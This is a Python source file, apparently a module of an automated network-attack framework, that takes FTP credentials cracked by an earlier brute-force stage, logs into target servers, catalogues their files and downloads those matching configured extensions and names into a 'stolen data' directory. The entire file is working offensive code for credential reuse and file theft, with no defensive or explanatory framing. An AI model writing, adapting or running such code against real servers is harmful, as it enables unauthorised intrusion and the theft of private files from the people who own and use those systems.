"""
steal_files_ftp.py - This script connects to FTP servers using provided credentials or anonymous access, searches for specific files, and downloads them to a local directory.
"""

import os
import logging
import time
from ftplib import FTP
from shared import SharedData
from logger import Logger
from timeout_utils import TimeoutContext

# Configure the logger
logger = Logger(name="steal_files_ftp.py", level=logging.INFO)

# Define the necessary global variables
b_class = "StealFilesFTP"
b_module = "steal_files_ftp"
b_status = "steal_files_ftp"
b_parent = "FTPBruteforce"
b_port = 21

class StealFilesFTP:
    """
    Class to handle the process of stealing files from FTP servers.
    """
    def __init__(self, shared_data):
        try:
            self.shared_data = shared_data
            self.ftp_connected = False
            self.stop_execution = False
            self.b_parent_action = "brute_force_ftp"  # Parent action status key
            logger.info("StealFilesFTP initialized")
        except Exception as e:
            logger.error(f"Error during initialization: {e}")

    def connect_ftp(self, ip, username, password):
        """
        Establish an FTP connection with 30 second timeout.
        """
        try:
            ftp = FTP(timeout=30)
            ftp.connect(ip, 21, timeout=30)
            ftp.login(user=username, passwd=password)
            self.ftp_connected = True
            logger.info(f"Connected to {ip} via FTP as {username}")
            return ftp
        except Exception as e:
            logger.error(f"FTP connection error for {ip} with user '{username}' and password '{password}': {e}")
            return None

    def save_file_listing(self, ip, mac, files, protocol="ftp"):
        """
        Save the complete file listing to a recon file for later analysis.
        """
        try:
            recon_dir = os.path.join(self.shared_data.datastolendir, "recon", "file_listings")
            os.makedirs(recon_dir, exist_ok=True)
            listing_file = os.path.join(recon_dir, f"{protocol}_{mac}_{ip}_files.txt")
            with open(listing_file, 'w') as f:
                f.write(f"# File listing for {ip} via {protocol.upper()}\n")
                f.write(f"# Total files discovered: {len(files)}\n")
                f.write(f"# Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write("#" + "=" * 60 + "\n")
                for file in sorted(files):
                    f.write(f"{file}\n")
            logger.info(f"Saved file listing ({len(files)} files)")
        except Exception as e:
            logger.error(f"Error saving file listing: {e}")

    def discover_all_files(self, ftp, dir_path, all_files, depth=0, max_depth=3, max_files=500):
        """
        Recursively discover files in the FTP share.
        Limited by max_depth and max_files to prevent excessive scanning.
        """
        if depth > max_depth:
            return  # Silently stop at max depth
        if self.stop_execution or self.shared_data.orchestrator_should_exit:
            return
        if len(all_files) >= max_files:
            return  # Stop if we've found enough files

        try:
            ftp.cwd(dir_path)
            items = ftp.nlst()
            for item in items:
                if self.stop_execution or self.shared_data.orchestrator_should_exit:
                    break
                if len(all_files) >= max_files:
                    break
                try:
                    ftp.cwd(item)
                    self.discover_all_files(ftp, os.path.join(dir_path, item), all_files, depth + 1, max_depth, max_files)
                    ftp.cwd('..')
                except Exception:
                    # It's a file, not a directory
                    all_files.append(os.path.join(dir_path, item))
        except Exception as e:
            logger.debug(f"Cannot access {dir_path}: {e}")

    def find_files(self, ftp, dir_path, ip=None, mac=None, depth=0, max_depth=None):
        """
        Find files in the FTP share based on the configuration criteria.
        Uses steal_max_depth and steal_max_files from config. Saves full file listing to recon.
        """
        # Get limits from config
        if max_depth is None:
            max_depth = getattr(self.shared_data, 'steal_max_depth', 3)
        max_files = getattr(self.shared_data, 'steal_max_files', 500)

        # Discover files with limits
        all_files = []
        self.discover_all_files(ftp, dir_path, all_files, depth, max_depth, max_files)

        # Save complete file listing for recon
        if ip and mac and all_files:
            self.save_file_listing(ip, mac, all_files, "ftp")

        logger.info(f"Discovered {len(all_files)} files on {ip or 'target'} (max_depth={max_depth})")

        # Filter for matching files
        matching_files = []
        for file in all_files:
            if self.stop_execution or self.shared_data.orchestrator_should_exit:
                break
            basename = os.path.basename(file)
            # Match by extension
            if any(file.endswith(ext) for ext in self.shared_data.steal_file_extensions):
                matching_files.append(file)
            # Match by name: path patterns (start with /) match end of path, others match basename
            elif any(file.endswith(fn) if fn.startswith('/') else fn == basename
                     for fn in self.shared_data.steal_file_names):
                matching_files.append(file)

        logger.info(f"Found {len(matching_files)} matching files to steal on FTP")
        return matching_files

    def steal_file(self, ftp, remote_file, local_dir):
        """
        Download a file from the FTP server to the local directory.
        """
        try:
            local_file_path = os.path.join(local_dir, os.path.relpath(remote_file, '/'))
            local_file_dir = os.path.dirname(local_file_path)
            os.makedirs(local_file_dir, exist_ok=True)
            with open(local_file_path, 'wb') as f:
                ftp.retrbinary(f'RETR {remote_file}', f.write)
            logger.success(f"Downloaded: {remote_file}")
        except Exception as e:
            logger.debug(f"Failed to download {remote_file}: {e}")

    def execute(self, ip, port, row, status_key):
        """
        Steal files from the FTP server.
        """
        start_time = time.time()
        logger.lifecycle_start("StealFilesFTP", ip, port)
        try:
            if 'success' in row.get(self.b_parent_action, ''):  # Verify if the parent action is successful
                self.shared_data.bjornorch_status = "StealFilesFTP"
                logger.info(f"Stealing files from {ip}:{port}...")

                # Get FTP credentials from the cracked passwords file
                ftpfile = self.shared_data.ftpfile
                credentials = []
                if os.path.exists(ftpfile):
                    with open(ftpfile, 'r') as f:
                        lines = f.readlines()[1:]  # Skip the header
                        for line in lines:
                            line = line.strip()
                            if not line:  # Skip empty lines
                                continue
                            parts = line.split(',')
                            if len(parts) >= 5 and parts[1] == ip:
                                credentials.append((parts[3], parts[4]))  # Username and password
                    logger.info(f"Found {len(credentials)} credentials for {ip}")

                if not credentials:
                    logger.error(f"No credentials found for {ip}. Skipping...")
                    duration = time.time() - start_time
                    logger.lifecycle_end("StealFilesFTP", 'failed', duration, ip)
                    return 'failed'

                def handle_timeout():
                    """
                    Timeout handler to stop the execution if no FTP connection is established.
                    """
                    if not self.ftp_connected:
                        logger.lifecycle_timeout("StealFilesFTP", "FTP connection", 240, ip)
                        self.stop_execution = True

                # Use TimeoutContext instead of Timer(240)
                mac = row['MAC Address']
                files_stolen = False
                connected = False
                with TimeoutContext(timeout=240, on_timeout=handle_timeout) as timeout_ctx:
                    # Attempt to steal files using each credential from bruteforce results
                    for username, password in credentials:
                        if timeout_ctx.should_stop or self.stop_execution or self.shared_data.orchestrator_should_exit:
                            break
                        try:
                            logger.debug(f"Trying {username} for {ip}")
                            ftp = self.connect_ftp(ip, username, password)
                            if ftp:
                                connected = True
                                remote_files = self.find_files(ftp, '/', ip, mac)
                                local_dir = os.path.join(self.shared_data.datastolendir, f"ftp/{mac}_{ip}/{username}")
                                if remote_files:
                                    for remote_file in remote_files:
                                        if timeout_ctx.should_stop or self.stop_execution or self.shared_data.orchestrator_should_exit:
                                            break
                                        self.steal_file(ftp, remote_file, local_dir)
                                    files_stolen = True
                                    logger.success(f"Stolen {len(remote_files)} files from {ip} as {username}")
                                ftp.quit()
                                if files_stolen:
                                    break  # Exit the loop as we have stolen files
                        except Exception as e:
                            logger.error(f"Error stealing files from {ip} with user '{username}': {e}")

                duration = time.time() - start_time
                if files_stolen:
                    logger.lifecycle_end("StealFilesFTP", 'success', duration, ip)
                    return 'success'
                elif connected:
                    # Connected successfully but no matching files found - not a failure
                    logger.info(f"No matching files found on {ip}:{port}")
                    logger.lifecycle_end("StealFilesFTP", 'success', duration, ip)
                    return 'success'
                else:
                    # Failed to connect with any credentials
                    logger.error(f"Failed to connect to FTP on {ip}:{port}")
                    logger.lifecycle_end("StealFilesFTP", 'failed', duration, ip)
                    return 'failed'
            else:
                duration = time.time() - start_time
                logger.lifecycle_end("StealFilesFTP", 'skipped', duration, ip)
                return 'failed'
        except Exception as e:
            logger.error(f"Unexpected error during execution for {ip}:{port}: {e}")
            duration = time.time() - start_time
            logger.lifecycle_end("StealFilesFTP", 'failed', duration, ip)
            return 'failed'

if __name__ == "__main__":
    try:
        shared_data = SharedData()
        steal_files_ftp = StealFilesFTP(shared_data)
        # Add test or demonstration calls here
    except Exception as e:
        logger.error(f"Error in main execution: {e}")
